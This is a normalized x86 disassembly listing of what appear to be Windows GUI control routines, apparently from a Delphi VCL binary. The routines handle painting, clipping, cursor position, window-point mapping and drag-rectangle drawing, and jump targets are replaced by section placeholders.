cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
test esi esi
je r-xdata
mov edx ebx
call sub_440380
mov edx ebx
mov eax esi
call sub_4402ac
mov eax ebx
call sub_43c574
sub_43ce40
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403454
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43e0d4
mov eax edi
mov si 0xffd0
call sub_403454
sub_43ced8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_450f00
mov edx ebx
mov eax esi
call sub_419afc
sub_43cefc
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43e0d4
pop ebx
retn
sub_43cf20
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43ce94
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404098
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43cea4
sub_43cf50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cfa5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043b4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cfac
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax esi
call sub_404468
mov edx eax
mov eax ebx
call sub_43cefc
sub_43cfd0
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41cff8
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43e0d4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41cff8
mov [ ebx + 0x84 ] eax
sub_43d158
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43d148
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43a0f0
mov eax esi
call sub_43a0f0
jmp r-xdata
sub_43d190
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413fa0
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413e34
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413fc0
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d368
mov eax ebx
call sub_453ed4
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403454
sub_43d210
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43d190
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43d190
jmp r-xdata
sub_43d234
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43d2ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d2d1
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
sub_43d2dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413fa0
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413f44
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43c8c0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d368
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443a0c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43c8c0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443708
push eax
call InvalidateRect
push ebp
call sub_43d2dc
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43d404
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_453eac
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43e0d4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403454
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d468
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443a0c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443708
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43d541
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_441514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443708
push eax
call ReleaseDC
retn
sub_43d5c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
call sub_43e108
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43ca64
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a10
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43e0d4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43b270
sub_43d69c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43d6d8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43d724
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43d750
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43cec4
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43ceb0
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a5c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a5c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_443708
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43d834
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43d880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403454
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403454
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43d944
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43d990
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43d9dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43daf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d618
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dafe
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43db30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43ca64
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403454
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403454
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403454
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403454
jmp r-xdata
sub_43dc20
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412ae8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43e108
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43ceb0
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43cec4
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412b38
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43de00
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43ca38
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403454
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_443708
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a634
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43ddeb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_443708
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_443708
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43c8c0
test esi esi
je r-xdata
sub_43de00
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403454
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43ec84
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403454
mov eax esi
call sub_43c968
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43c924
mov ecx eax
xor edx edx
xor eax eax
call sub_412b10
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403454
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43dea4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43ded4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43df40
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43e000
sub_43df70
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43dfa0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43ca64
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43dfcc
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43e000
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
